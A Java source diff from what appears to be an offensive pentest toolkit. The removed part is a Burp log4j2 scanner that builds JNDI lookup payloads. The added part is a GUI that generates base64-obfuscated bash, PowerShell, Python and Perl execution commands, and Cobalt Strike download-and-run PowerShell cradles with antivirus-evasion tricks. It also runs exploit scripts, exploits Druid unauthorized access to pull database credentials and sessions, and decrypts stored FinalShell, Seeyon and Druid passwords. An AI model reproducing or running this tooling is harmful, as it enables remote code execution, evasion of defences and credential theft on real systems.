-                    if (respCookie.contains(words_vuln) && respCookie.contains(ij - 1 + "." + this.logxn_dnslog.trim()) ) {
-                        String param_vuln = "";
-                        for (int param_vuln_i = param_i;param_vuln_i >= 0; param_vuln_i -- ){
-                            if (respCookie.contains("\"" +param_vuln_i + "." + firstheaders[0].trim().toLowerCase() )  ){
-                                param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                            }
-                        }
-                        synchronized (this.Udatas) {
-                            int row = this.Udatas.size();
-                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response3).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                            fireTableRowsInserted(row, row);
-                            List<IScanIssue> issues = new ArrayList(1);
-                            issues.add(new CustomScanIssue(
-                                    httpService,
-                                    url,
-                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                    "log4j2 RCE",
-                                    "log4j2 RCE " + param_vuln,
-                                    "High"
-                            ));
-                            return issues;
-                        }
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-
-        }
-        return null;
     }
 
 
-    @Override
-    public List<JMenuItem> createMenuItems ( IContextMenuInvocation invocation ) {
-        JMenuItem jMenuItem = new JMenuItem("Send to log4j2 Scanner");
-        List<JMenuItem> jMenuItemList = new ArrayList<>();
+    @FXML
+    // tasklist /svc按钮
+    public void onButton8Click(ActionEvent event) throws IOException {
 
-//        JMenu jMenu = new JMenu("log4j2");
+        //获取tasklist /svc的参数
+        String tasklist = mTextArea6.getText().trim();
 
-//        jMenu.add(jMenuItem);
-        jMenuItemList.add(jMenuItem);
+        Map<String,String> exelist = new HashMap<String, String>();
 
-        // 监听上下文菜单点击事件
-        jMenuItem.addActionListener(a -> {
-
-            IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];
-            IRequestInfo iRequestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);
-            URL url = this.helpers.analyzeRequest(iHttpRequestResponse).getUrl();
-            String reqMethod = this.helpers.analyzeRequest(iHttpRequestResponse).getMethod();
-//            List<String> request_header = iRequestInfo.getHeaders(); // 获取请求头
-
-            byte[] byte_Request = iHttpRequestResponse.getRequest();
-            int bodyOffset = iRequestInfo.getBodyOffset();
-            String request2 = new String(byte_Request); //byte[] to String
-            String body = request2.substring(bodyOffset); // 请求体
-
-            String code_body = request2.substring(bodyOffset); // 原始请求体
-
-            String[] white_lists = BurpExtender.this.whitelists_area.getText().split("\n");
-            String[] headers_lists = BurpExtender.this.customheaders_area.getText().split("\n");
-            File f;
-            int param_i = 0;
-            String privatednsResponseurl = "";
-            String os = System.getProperty("os.name");
-            if (os.toLowerCase().startsWith("win")) {
-                f = new File("log4j2burpscanner.properties");
-            }else{
-                String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
-                f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
+        String[] exetestlist = readFileByLines("property/exetest.txt");
+        for (String str : exetestlist)
+            if (str!=null) {
+//                System.out.println( "exetestlist" + str);
+                exelist.put(str.split(": ")[0], str.split(": ")[1]);
             }
-            BufferedReader reader = null;
-            StringBuffer sbf = new StringBuffer() ;
-            String output = "";
+        String[] resultlist2 = tasklist.split("\n"); // 将读取的进程通过换行分割成字符串组
+        String[] resultlist22 ;
+
+//        System.out.println(exelist);
+
+        resultlist22 = taskexechange(resultlist2);
+
+        String finallist = ifexe(resultlist22,exelist);
+
+        mTextArea7.setText(finallist);
+
+
+    }
+
+    // python脚本模块，0.57开始调用pocsuite
+    public void onButton9Click(ActionEvent actionEvent) {
+        new Thread() { // 由于createmenuitem不能进行创建buildHttpMessage，所以另起一个线程进行探测
+            public void run() {
+                //String pythonpath ;
+                String os = System.getProperty("os.name");
+                String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径
+
+                String pythonscript;
+                if (!(mListView5.getSelectionModel().getSelectedItem() == null))
+                    pythonscript = "pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + '/' + mListView5.getSelectionModel().getSelectedItem();
+                else
+                    pythonscript = "pythonexp/" + mListView4.getSelectionModel().getSelectedItem();
+
+                String params = mTextField7.getText().trim();
+                String total = "";
+                //String[] paramlist = params.split(" ");
+                String[] command = new String[100];
+                if (mTextField83.getText().trim().contains(" ")) {
+                    command[0] = mTextField83.getText().trim().split(" +")[0];
+                    command[1] = mTextField83.getText().trim().split(" +")[1];
+                    command[2] = "-r";
+                    command[3] = pythonscript;
+
+                    String vulnurl = mTextArea92.getText().trim();
+                    if (!vulnurl.equals("")) {
+                        poctoFile(vulnurl, "pythonexp/vuln.txt");
+                        command[4] = "-f";
+                        command[5] = "pythonexp/vuln.txt";
+                    } else if (!params.equals("")) {
+                        command[4] = "-u";
+                        command[5] = params;
+                    }
+                }else{
+                command[0] = mTextField83.getText().trim();
+                command[1] = "-r";
+                command[2] = pythonscript;
+
+                String vulnurl = mTextArea92.getText().trim();
+                if (!vulnurl.equals("")) {
+                    poctoFile(vulnurl, "pythonexp/vuln.txt");
+                    command[3] = "-f";
+                    command[4] = "pythonexp/vuln.txt";
+                } else if (!params.equals("")) {
+                    command[3] = "-u";
+                    command[4] = params;
+                }
+                }
+                String[] commands = deleteArrayNull(command);
+
+
+                for (String s : commands)
+                    System.out.println(s);
+
+                try {
+                    Process pro = Runtime.getRuntime().exec(commands);
+                    InputStream is1 = pro.getInputStream();
+                    BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
+                    InputStream is2 = pro.getErrorStream();
+                    BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));
+                    String line = null;
+                    while ((line = buf.readLine()) != null) {
+                        total = total + '\n' + line;
+                        mTextArea9.setText(total); // 将python脚本输出结果回显
+                        System.out.println(line);
+                    }
+                    while ((line = buf2.readLine()) != null) {
+                        total = total + '\n' + line;
+                        mTextArea9.setText(total); // 将python脚本输出结果回显
+                        System.out.println(line);
+                    }
+//            if (mTextArea9.getText().equals("")){
+//                mTextArea9.setText("目标可能无漏洞或者无法连通。");
+//            }
+
+                } catch (IOException e) {
+                    total = total + e.toString();
+                    mTextArea9.setText(total); // 将python脚本输出结果回显
+                }
+            }
+        }.start();
+    }
+
+    // finalshell密码转换、seeyon数据库密码解密模块
+    // druid 密码转换
+    public void onButton10Click(ActionEvent actionEvent) throws Exception {
+        String total = "";
+        //获取待解密的明文
+        String encode = mTextArea10.getText().trim();
+        if (!encode.equals("")) {
+            String[] encodes = encode.split("\n");
+            for (String str : encodes)
+                if (str != null) {
+                    total = total + '\n' + str + "[decode]:" + decodePass(str);
+                }
+            mTextArea10.setText(total.trim());
+        }
+
+        String total2 = "";
+        //获取待解密的明文
+        String encode2 = mTextArea11.getText().trim();
+        if (!encode2.equals("")) {
+            String[] encodes2 = encode2.split("\n");
+            for (String str : encodes2)
+                if (str != null) {
+                    String asciis = stringToAscii(jdkBas64Decode2(str));
+                    total2 = total2 + '\n' + str + "[decode]:" + asciiToString(asciis);
+                }
+            mTextArea11.setText(total2.trim());
+        }
+
+        String total3 = "";
+        //获取待解密的明文
+        String encode3 = mTextArea12.getText().trim();
+        if (!encode3.equals("")) {
+            if (mRadiobutton2.isSelected()){ // 选中即为1.0.16版本之后的
+                String[] encodes31 = encode3.split("\n");
+                String publicKey = encodes31[0];
+                String cipherText = encodes31[1];
+                String decryptPassword = ConfigTools.decrypt(publicKey, cipherText);
+                System.out.println("decryptPassword：" + decryptPassword);
+                total3 = total3 + '\n' + encode3 + "[decode]:" + decryptPassword;
+            }
+            else {
+                String[] encodes3 = encode3.split("\n");
+                for (String str : encodes3)
+                    if (str != null) {
+                        total3 = total3 + '\n' + str + "[decode]:" + ConfigTools.decrypt(str);
+                    }
+            }
+            mTextArea12.setText(total3.trim());
+        }
+    }
+
+    // unicode转中文按钮
+    public void onButton13Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(UnicodeDecode(mTextArea13content));
+    }
+
+    // 中文转unicode按钮
+    public void onButton14Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(UnicodeEncode(mTextArea13content));
+    }
+
+    // URL编码按钮
+    public void onButton15Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        String decode_text = "";
+
+        // 为处理非url编码字符但是存在百分号的情况
+        //mTextArea13content = mTextArea13content.replaceAll("%(?![0-9a-fA-F]{2})", "%25");
+
+        //
+        //try {
+        decode_text = URLEncoder.encode(mTextArea13content, "utf-8");
+        //}catch (Exception e){
+        //
+        //}
+        mTextArea13.setText(decode_text);
+    }
+
+    // URL解码按钮
+    public void onButton16Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        // 为处理非url编码字符但是存在百分号的情况
+        mTextArea13content = mTextArea13content.replaceAll("%(?![0-9a-fA-F]{2})", "%25");
+        mTextArea13.setText(UnicodeDecode(URLDecoder.decode(mTextArea13content,"utf-8")));
+
+
+        
+    }
+
+    // Base64编码按钮
+    public void onButton17Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        String base64encodedString = Base64.getEncoder().encodeToString(mTextArea13content.getBytes(StandardCharsets.UTF_8));
+        mTextArea13.setText(base64encodedString);
+    }
+
+    // Base64解码按钮
+    public void onButton18Click(ActionEvent actionEvent) throws IllegalArgumentException {
+        String total = "";
+        String mTextArea13content = mTextArea13.getText().trim();
+        // 需要判断长度，否则遇到奇数会解码失败
+        try {
+            byte[] base64decodedBytes = Base64.getDecoder().decode(mTextArea13content);
+            total = total + "原始字符串解码：\n" + UnicodeDecode(new String(base64decodedBytes, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try {
+            byte[] base64decodedBytes0 = Base64.getDecoder().decode(mTextArea13content + "="); // 取第三位开始的
+            total = total + "\n\n" + "末尾加了一个=：\n" + UnicodeDecode(new String(base64decodedBytes0, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try {
+            byte[] base64decodedBytes1 = Base64.getDecoder().decode(mTextArea13content + "=="); // 取第三位开始的
+            total = total + "\n\n" + "末尾加了两个=：\n" + UnicodeDecode(new String(base64decodedBytes1, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try {
+            byte[] base64decodedBytes2 = Base64.getDecoder().decode(mTextArea13content.substring(2)); // 取第三位开始的
+            total = total + "\n\n" + "取第三位开始：\n" + UnicodeDecode(new String(base64decodedBytes2, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try{
+        byte[] base64decodedBytes3 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-64)); // 取后六十四位
+        total = total + "\n\n" + "取后六十四位：\n" + UnicodeDecode(new String(base64decodedBytes3, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try{
+        byte[] base64decodedBytes4 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-32)); // 取后三十二位
+        total = total + "\n\n" + "取后三十二位：\n" + UnicodeDecode(new String(base64decodedBytes4, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        try{
+            byte[] base64decodedBytes5 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-16)); // 取后三十二位
+            total = total + "\n\n" + "取后十六位：\n" + UnicodeDecode(new String(base64decodedBytes5, StandardCharsets.UTF_8));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        if (total.equals("")){
+            total = total + mTextArea13content +  "解码错误";
+        }
+        mTextArea13.setText(total);
+    }
+
+    // Hex编码按钮
+    public void onButton19Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(str2HexStr(mTextArea13content,"utf-8"));
+    }
+
+    // Hex解码按钮
+    public void onButton20Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(hexStr2Str(mTextArea13content,"utf-8"));
+    }
+
+    // Hex编码按钮
+    public void onButton21Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(HtmlEncode(mTextArea13content));
+    }
+
+    // Hex解码按钮
+    public void onButton22Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(HtmlDecode(mTextArea13content));
+    }
+
+
+    // ascii编码按钮
+    public void onButton23Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        mTextArea13.setText(AsciiEncode(mTextArea13content));
+    }
+
+    // ascii解码按钮
+    public void onButton24Click(ActionEvent actionEvent) throws Exception {
+        String mTextArea13content = mTextArea13.getText().trim();
+        String[] t = mTextArea13content.split(" ");
+        String total = "";
+        for (String ts:t)
+            total = total + byteAsciiToChar(Integer.parseInt(ts));
+        mTextArea13.setText(total.trim());
+    }
+
+    public void mRadiobutton3Click(ActionEvent actionEvent) throws Exception {
+        String inputString = mTextArea14.getText().trim();
+        String outputString = "";
+        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+        outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n或者\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i" ;
+        mTextArea15.setText(outputString);
+    }
+
+    public void mRadiobutton4Click(ActionEvent actionEvent) throws Exception {
+        String inputString = mTextArea14.getText().trim();
+        String outputString = "";
+        byte[] sb2 = inputString.getBytes();
+        int i = 0;
+        byte[] bt3 = new byte[sb2.length+sb2.length];
+        for (byte btest:sb2) {
+            bt3[i++] = btest;
+            bt3[i++] = (byte)0x00;
+        }
+        String str= new String (bt3);
+        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
+        outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString ;
+
+        mTextArea15.setText(outputString);
+
+    }
+
+    public void mRadiobutton5Click(ActionEvent actionEvent) throws Exception {
+        String inputString = mTextArea14.getText().trim();
+        String outputString = "";
+        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+        outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";
+        mTextArea15.setText(outputString);
+
+    }
+
+    public void mRadiobutton6Click(ActionEvent actionEvent) throws Exception {
+        String inputString = mTextArea14.getText().trim();
+        String outputString = "";
+        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+        outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
+        mTextArea15.setText(outputString);
+
+    }
+
+    // cs命令输入cs payload地址进行自动输出上线命令
+    public void csEncode1(KeyEvent event) throws IOException {
+        String inputString = mTextField9.getText().trim();
+        String outputString1 = "";
+        String outputString2 = "";
+        String outputString3 = "";
+        String outputString4 = "";
+
+        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
+        mTextArea16.setText(outputString1); // 第一个框
+
+        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";
+
+        byte[] sb2 = strtest.getBytes();
+        int i = 0;
+        byte[] bt3 = new byte[sb2.length+sb2.length];
+        for (byte btest:sb2) {
+            bt3[i++] = btest;
+            bt3[i++] = (byte)0x00;
+        }
+        String str= new String (bt3);
+        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
+        mTextArea17.setText("powershell -enc " + base64encodedString); // 第二个框
+
+
+        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')";
+        mTextArea18.setText(outputString2); // 第三个框
+
+        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
+        mTextArea19.setText(outputString3); // 第四个框
+
+        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
+        mTextArea20.setText(outputString4); // 第五个框
+
+
+    }
+
+
+
+
+
+    @FXML
+    // 命令模块
+    // mTextArea14 输入命令自动出相应命令
+    public void shellEncode(KeyEvent event) throws FileNotFoundException {
+        String inputString = mTextArea14.getText().trim();
+        if(inputString.trim() == ""){
+            mTextArea15.setText("");
+        }else {
+            String outputString = "";
+            if (mRadiobutton3.isSelected()) { // 选中Bash
+                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+                outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n或者\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i";
+
+            } else if (mRadiobutton4.isSelected()) { // 选中Powershell
+                byte[] sb2 = inputString.getBytes();
+                int i = 0;
+                byte[] bt3 = new byte[sb2.length + sb2.length];
+                for (byte btest : sb2) {
+                    bt3[i++] = btest;
+                    bt3[i++] = (byte) 0x00;
+                }
+                String str = new String(bt3);
+                String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
+                outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString;
+
+            } else if (mRadiobutton5.isSelected()) { // 选中Python
+                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+                outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";
+
+            } else if (mRadiobutton6.isSelected()) { // 选中Perl
+                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
+                outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
+            }
+            mTextArea15.setText(outputString);
+        }
+    }
+
+
+    // 单个目标批量exp利用按钮
+    public void onButton11Click(ActionEvent actionEvent) throws Exception {
+        //获取url
+        String url = mTextField51.getText().trim();
+        String pythonscript = "pythonexp/poc2jarpiliangyml.py";
+        String pythonpath = mTextField82.getText().trim();
+        String exppath;
+        //try {
+        exppath = mListView1.getSelectionModel().getSelectedItem();
+        //}catch (Exception e){
+        //    exppath = "/";
+        //}
+        String isproxy = "0";
+        String host = "127.0.0.1";
+        String port = "8080";
+        if (exppath == null)
+            exppath = "/";
+        else if (!exppath.contains("/"))
+            exppath = "/" + exppath;
+
+            String[] ipportlist = mLabeltest.getText().trim().split(":");
+
+            if (ipportlist.length > 1) {
+                isproxy = "1";
+                host = ipportlist[2];
+                port = ipportlist[3];
+            }
+
+
+        String total = "";
+        String[] command = new String[100];
+        command[0] = pythonpath;
+        command[1] = pythonscript;
+        command[2] = "-u";
+        command[3] = url;
+        command[4] = "-r";
+        command[5] =  exppath;
+        command[6] = "-x";
+        command[7] =  isproxy;
+        command[8] = "-h";
+        command[9] =  host;
+        command[10] = "-p";
+        command[11] =  port;
+
+        String[] commands = deleteArrayNull(command);
+
+        for (String s : commands)
+            System.out.println(s);
+
+        try {
+            Process pro = Runtime.getRuntime().exec(commands);
+            InputStream is1 = pro.getInputStream();
+            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
+            String line = null;
+            while ((line = buf.readLine()) != null) {
+                total = total + '\n' + line;
+                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
+                System.out.println(line);
+            }
+        } catch (Exception e) {
+            // TODO: handle exception
+        }
+    }
+
+    // 保存CS payload路径
+    public void onButton25Click(ActionEvent actionEvent) throws IOException {
+        String inputString = mTextField9.getText().trim();
+        String python2path = mTextField8.getText().trim(); // python2 路径
+        String python3path = mTextField82.getText().trim(); // python3 路径
+        String pocsuitepath = mTextField83.getText().trim(); // pocsuite 路径
+
+        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径
+
+        String os = System.getProperty("os.name");
+
+
+        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {
+
+            System.out.println("无jar，不修改");
+
+        }else if(os.toLowerCase().startsWith("win")){
+            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path + '\n' + "cspayload=" + inputString +  '\n' + "pocsuite=" + pocsuitepath ;
+            poctoFile(target, "property/config.properties");
+
+        }else{
+            Properties prop = new Properties();
+            prop.load(Main.class.getResourceAsStream("/config.properties"));  // 读取源文件
+
+            prop.setProperty("python2path", python2path);
+            prop.setProperty("python3path", python3path);
+            prop.setProperty("cspayload", inputString);
+            prop.setProperty("pocsuite", pocsuitepath);
+            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";
+
+            System.out.println(tempPath);
+            Writer w = new FileWriter(tempPath);
+            prop.store(w, "python run path");
+            w.close();
+            String[] command = new String[100];
+            command[0] = "jar";
+            command[1] = "uf";
+            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+            command[3] = "config.properties";
+            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件
+
+            String[] commands = deleteArrayNull(command);
+            for (String s : commands)
+                System.out.println(s);
+
             try {
-                reader = new BufferedReader(new FileReader(f));
-                String tempStr;
-                while ((tempStr = reader.readLine()) != null) {
-                    sbf.append(tempStr + '\n');
-                }
-                reader.close();
-                output =  sbf.toString();
-                if (output.contains("isuseceye=1")){
-                    this.logxn = false;
-                    this.ceyeio = true;
-                    this.logxn_dnslog = FileGetValue(f,"ceyednslog");
-                    this.ceyetoken = FileGetValue(f,"ceyetoken");
-                }else{
-                    this.ceyeio = false;
-                }
-                if (output.contains("isuseprivatedns=1")){
-                    this.logxn = false;
-                    this.ceyeio = false;
-                    this.privatedns = true;
-                    this.logxn_dnslog = FileGetValue(f,"privatednslogurl");
-                    privatednsResponseurl = FileGetValue(f,"privatednsResponseurl");
-                }else{
-                    this.privatedns = false;
-                }
+                Process pro = Runtime.getRuntime().exec(commands);
+                String[] command2 = new String[100];
+                Robot r = new Robot();
+                r.delay(500);
+                command2[0] = "rm";
+                command2[1] = tempPath;
+                String[] commands2 = deleteArrayNull(command2);
+                Process pro2 = Runtime.getRuntime().exec(commands2);
 
-                if( output.contains("isuseceye=0") && output.contains("isuseprivatedns=0")) {
-                    this.logxn_dnslog = this.logxn_dnslog_code;
-                    this.logxn = true;
-//                    stdout.println(this.logxn_dnslog);
-                }
+            } catch (Exception e) {
+                // TODO: handle exception
+            }
+        }
+    }
 
-                if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0") ) {
-                    stdout.println("1");
-                    return;
-                }
+    // druid未授权漏洞利用
+    public void onButton26Click(ActionEvent actionEvent) throws Exception {
+        proxy();
+        String druidVulnUrl = mTextField10.getText().trim(); // druid漏洞地址
+        String[] JdbcUsername  = getJdbcUsername(druidVulnUrl);
+        mTextField11.setText(JdbcUsername[0]);  // jdbc链接
+        mTextField12.setText(JdbcUsername[1]);  // 数据库用户名
 
-                if (output.contains("isuseUserAgentTokenXff=0")){
-                    this.isuseUserAgentTokenXff = false;
-                }else{
-                    this.isuseUserAgentTokenXff = true;
-                }
+        String[] sqlList = getSql(druidVulnUrl);
+        String sql = "";
+        for(int i=0;i<sqlList.length;i++)
+            sql = sql  + sqlList[i] + "\n\n";
+        mTextArea21.setText(sql); // sql语句
 
-                if (output.contains("isuseXfflists=1")){
-                    this.isuseXfflists = true;
-                }else{
-                    this.isuseXfflists = false;
-                }
-
-                if (output.contains("isuseAllCookie=0")){
-                    this.isuseAllCookie = false;
-                }else{
-                    this.isuseAllCookie = true;
-                }
-
-                if(output.contains("isuseRefererOrigin=1")){
-                    this.isuseRefererOrigin = true;
-                }else{
-                    this.isuseRefererOrigin = false;
-                }
-
-                if(output.contains("isuseContenttype=1")){
-                    this.isuseContenttype = true;
-                }else{
-                    this.isuseContenttype = false;
-                }
-
-                if(output.contains("isuseAccept=1")){
-                    this.isuseAccept = true;
-                }else{
-                    this.isuseAccept = false;
-                }
-
-                if(output.contains("isip=1") && output.contains("isuseprivatedns=1")){
-                    this.isip = true;
-                    this.isipincreasing = false;
-                }else{
-                    this.isip = false;
-                    this.isipincreasing = true;
-                }
-                this.dnsldaprmi = FileGetValue(f, "dnsldaprmi").trim();
-                this.jndiparam = FileGetValue(f,"jndiparam").trim();
-
-                if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0")) {
-//                    stdout.println("1");
-                    return;
-                }
-
-            } catch (IOException ee) {}
-
-            byte[] request = iHttpRequestResponse.getRequest();
-            IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);
-
-            List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
-            // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。
-
-            List<List> request_headers = new ArrayList<List>(); // 请求集
-
-            List<String> code_headers = new ArrayList<String>() ;// 原请求
-
-            List<String> code_headers2 = new ArrayList<String>() ;// 原请求2
-
-            IHttpService httpService = iHttpRequestResponse.getHttpService();
-            String host = httpService.getHost();
-            host = host + "." + httpService.getPort();
-            String request_header_host = headers_to_host(request_header) ;
-//            stdout.println(request_header_host);
-
-            if (host.equals("log.xn--9tr.com")) // 白名单设置
-                return ;
-
-            if ( !BurpExtender.this.whitelists_area.getText().trim().equals("") ) { // 判断白名单不为空
-                for (String white_host_single : white_lists) // 白名单设置
-                {
-//                stdout.println(white_host_single);
-                    white_host_single = white_host_single.replace("*", "");
-                    String[] hostlists = host.split(":");
-                    if ( hostlists[0].endsWith(white_host_single) || request_header_host.endsWith(white_host_single) ) {
-                        return ;
+        String[][] lists = getUri(druidVulnUrl);
+        String uriLists = "";
+        for(int i = 0;i<lists.length-1;i++)
+            for(int j = i+1;j<lists.length-1;j++)
+                if (lists[i][0] != null && lists[j][0] != null ) {
+                    if ( Integer.parseInt(lists[i][2]) < Integer.parseInt(lists[j][2])){
+                        String[][] mid = new String[1][3];
+                        mid[0][0] = lists[i][0];
+                        mid[0][1] = lists[i][1];
+                        mid[0][2] = lists[i][2];
+                        lists[i][0] = lists[j][0];
+                        lists[i][1] = lists[j][1];
+                        lists[i][2] = lists[j][2];
+                        lists[j][0] = mid[0][0];
+                        lists[j][1] = mid[0][1];
+                        lists[j][2] = mid[0][2];
                     }
                 }
-            }
+        for(int i = 0;i<lists.length;i++)
+            if (lists[i][0] != null )
+                uriLists = uriLists + lists[i][0] + '\n';
 
+        mTextArea22.setText(uriLists);
 
-            String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
-            String[] firstheaders = firstrequest_header.split(" ");
+        String[] sessionList = getSession(druidVulnUrl);
+        String session = "";
+        for(int i=0;i<sessionList.length;i++)
+            session = session + sessionList[i] + '\n';
+        mTextArea24.setText(session); // session
+    }
 
-            String uri = firstheaders[1].split("\\?",2)[0].replace("/",".");
+    // 生成poc，cors与jsonp
+    public void onButton27Click(ActionEvent actionEvent) throws Exception {
+        String http = "http"; // 默认协议为http
 
-            if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 25) {
-                uri = firstheaders[1].split("\\?")[0].replace("/",".").substring(0, 25);
-            }
+        if(mRadiobutton7.isSelected()) { // 如果CORS选中
+            String httpRequests = mTextArea25.getText().trim(); // CORS的数据包
+            if (mRadiobutton9.isSelected())
+                http = "https";
+            String CorsContent = CorsPocMake(httpRequests,http);
+            mTextArea26.setText(CorsContent);
 
-            String total_uri = "";
-            String[] uris = uri.split("\\.");
-            for(String uri_single:uris) {
-                if (!uri_single.equals(""))
-                    total_uri = total_uri + "." + uri_single.substring(0,1);
-            }
-            uri = total_uri;
+        }else if(mRadiobutton8.isSelected()){
+            String jsonpVulnurl = mTextArea25.getText().trim(); // jsonp地址
+            String Content = JsonpPocMake(jsonpVulnurl);
+            mTextArea26.setText(Content);
+        }
+    }
 
-            if (uri.endsWith("."))
-                uri = uri.substring(0,uri.length()-1);
-
-            if (this.jndiparam.equals("jndi"))
-                this.jndiparam = this.jndiparam + ":";
-
-            String random_str = RandomStringUtils.randomAlphanumeric(3); //生成指定长度的字母和数字的随机组合字符串
-
-            if (!this.dnsldaprmi.contains(":"))
-                this.dnsldaprmi = this.dnsldaprmi + ":";
-
-            String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
-//            String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + firstheaders[0].trim() + "." + host  + uri + "."+ this.logxn_dnslog.trim() + "/%20test}";
-
-            if (this.isip && this.privatedns){
-                vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + this.logxn_dnslog.trim() + "/%20test}";
-            }
-
-            String uri_total = "";
-
-            // uri黑名单，如果匹配到不进行扫描
-            List<String> blacklists = Arrays.asList(".js",".jpg",".png",".jpeg",".svg",".mp4",".css",".mp3",".ico",".woff",".php",".asp",".aspx",".gif",".bmp",".jpeg");
-
-            for (String black_single: blacklists)
-                if (firstheaders[1].split("\\?")[0].endsWith(black_single)) // 增加 ?分割后的第一个字符串进行匹配
-                    return ;
-
-            //firstheaders[0] 为请求方法
